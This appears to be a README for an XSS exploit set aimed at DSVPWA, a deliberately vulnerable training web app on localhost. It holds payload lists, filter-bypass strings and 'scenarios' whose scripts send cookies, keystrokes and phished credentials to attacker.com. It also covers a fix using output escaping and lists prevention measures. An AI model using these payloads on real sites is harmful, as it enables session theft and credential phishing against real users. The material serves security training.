# DSVPWA XSS Exploits

## Overview
This directory contains Cross-Site Scripting (XSS) exploits for DSVPWA. DSVPWA has multiple XSS vulnerabilities including reflected and stored XSS in various endpoints.

## Target Application
- **App**: DSVPWA
- **Port**: 65413
- **Vulnerability**: XSS (Reflected & Stored)
- **Severity**: HIGH

## Available Exploits

### 1. reflected_xss.py
**Type**: Reflected XSS  
**Target Endpoints**:
- `/vulnerable/xss_r/?name=<PAYLOAD>`
- Search functionality
- Error pages with reflected input

**Usage**:
```bash
# Basic reflected XSS
python reflected_xss.py http://localhost:65413

# With custom payload
python reflected_xss.py http://localhost:65413 --payload "<script>alert(document.cookie)</script>"

# Manual testing
curl "http://localhost:65413/vulnerable/xss_r/?name=<script>alert('XSS')</script>"
```

**Payloads**:
```html
<!-- Basic alert -->
<script>alert('XSS')</script>

<!-- Cookie theft -->
<script>fetch('http://attacker.com/?c='+document.cookie)</script>

<!-- DOM manipulation -->
<img src=x onerror="alert(document.cookie)">

<!-- Event handler -->
<body onload="alert('XSS')">

<!-- SVG vector -->
<svg onload="alert('XSS')">
```

### 2. stored_xss_guestbook.py
**Type**: Stored XSS  
**Target**: Guestbook feature at `/vulnerable/xss_s/`

**Usage**:
```bash
# Inject stored XSS in guestbook
python stored_xss_guestbook.py http://localhost:65413

# With custom payload
python stored_xss_guestbook.py http://localhost:65413 --payload "<script>alert(document.domain)</script>"

# Manual POST
curl -X POST http://localhost:65413/vulnerable/xss_s/ \
  -d "name=Attacker&message=<script>alert('Stored XSS')</script>"
```

**Why Stored XSS is More Dangerous**:
- Persists in database
- Affects ALL users who view the page
- No user interaction needed
- Can create worms/self-propagating attacks

## Exploitation Scenarios

### Scenario 1: Cookie Theft
```html
<script>
new Image().src='http://attacker.com/log.php?c='+document.cookie;
</script>
```

### Scenario 2: Session Hijacking
```html
<script>
fetch('http://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({
    cookie: document.cookie,
    url: window.location.href
  })
});
</script>
```

### Scenario 3: Keylogger
```html
<script>
document.onkeypress = function(e) {
  fetch('http://attacker.com/keys?k='+e.key);
}
</script>
```

### Scenario 4: Phishing Overlay
```html
<script>
document.body.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999"><h1>Session Expired</h1><form action="http://attacker.com/phish"><input name="user" placeholder="Username"><input name="pass" type="password" placeholder="Password"><button>Login</button></form></div>';
</script>
```

## Testing Steps

1. **Start DSVPWA**:
```bash
cd projects/DSVPWA
docker-compose up -d
# Wait for startup
sleep 5
```

2. **Test Reflected XSS**:
```bash
# Basic test
curl "http://localhost:65413/vulnerable/xss_r/?name=<script>alert(1)</script>"

# Should see the script reflected in HTML without encoding
```

3. **Test Stored XSS**:
```bash
# Inject payload
python stored_xss_guestbook.py http://localhost:65413

# Visit guestbook page
firefox http://localhost:65413/vulnerable/xss_s/
# Alert should fire for all visitors
```

4. **Verify in Browser**:
- Open: http://localhost:65413/vulnerable/xss_r/?name=test
- Replace 'test' with XSS payload
- Check if JavaScript executes

## Defense Analysis

**Why DSVPWA is Vulnerable**:
```python
# No output encoding
return "<h1>Welcome " + request.args.get('name') + "</h1>"

# No input validation
message = request.form.get('message')
db.save(message)  # Stored directly
```

**How to Fix**:
```python
from markupsafe import escape

# Escape output
return f"<h1>Welcome {escape(name)}</h1>"

# Or use template auto-escaping
return render_template('welcome.html', name=name)
# In template: {{ name }} (auto-escaped by default)
```

## Detection Techniques

**Manual Testing**:
1. Try basic payloads: `<script>alert(1)</script>`
2. Test different contexts: HTML, JavaScript, attribute
3. Check for encoding/filtering
4. Bypass attempts if filtered

**Automated Tools**:
```bash
# XSStrike
python xsstrike.py -u "http://localhost:65413/vulnerable/xss_r/?name=test"

# Burp Suite Scanner
# Use Active Scan on XSS endpoints

# w3af
w3af_console
target set http://localhost:65413/
plugins output console
plugins audit xss
start
```

## Advanced XSS Techniques

### Filter Bypass Examples
```html
<!-- Uppercase evasion -->
<SCrIpT>alert(1)</SCrIpT>

<!-- Encoding -->
<img src=x onerror="&#97;lert(1)">

<!-- Without script tags -->
<img src=x onerror="alert(1)">
<svg/onload=alert(1)>

<!-- Without quotes -->
<img src=x onerror=alert(1)>

<!-- Without parentheses -->
<script>onerror=alert;throw 1</script>

<!-- Without spaces -->
<svg/onload=alert`1`>
```

### Context-Specific Payloads
```html
<!-- In HTML attribute -->
" onload="alert(1)

<!-- In JavaScript string -->
'; alert(1); //

<!-- In IMG src -->
javascript:alert(1)

<!-- In event handler -->
onclick="alert(1)"
```

## Real-World Impact

**Cookie Theft**: Attacker steals session tokens
**Account Takeover**: Using stolen sessions
**Defacement**: Modifying page content
**Malware Distribution**: Redirecting to malicious sites
**Phishing**: Creating fake login forms
**Keylogging**: Capturing user input
**Cryptocurrency Mining**: Background mining scripts

## Notes
**WARNING**: Stored XSS is CRITICAL severity
- Affects all users who view the content
- Persists across sessions
- Can lead to mass account compromise
- Can create self-propagating XSS worms

**Prevention**:
- Always escape user input in output
- Use Content Security Policy (CSP)
- Enable HTTPOnly cookies
- Use template engines with auto-escaping
- Validate and sanitize input
- Use modern frameworks that escape by default

## Related Exploits
- See `../../chatapp/xss/` for chat-based stored XSS
- See `../../ecomstore/xss/` for product review XSS
- See `../../vulnblog/xss/` for blog comment XSS

## References
- OWASP XSS Guide: https://owasp.org/www-community/attacks/xss/
- PortSwigger XSS Cheat Sheet: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
- Stored vs Reflected XSS: https://owasp.org/www-community/Types_of_Cross-Site_Scripting
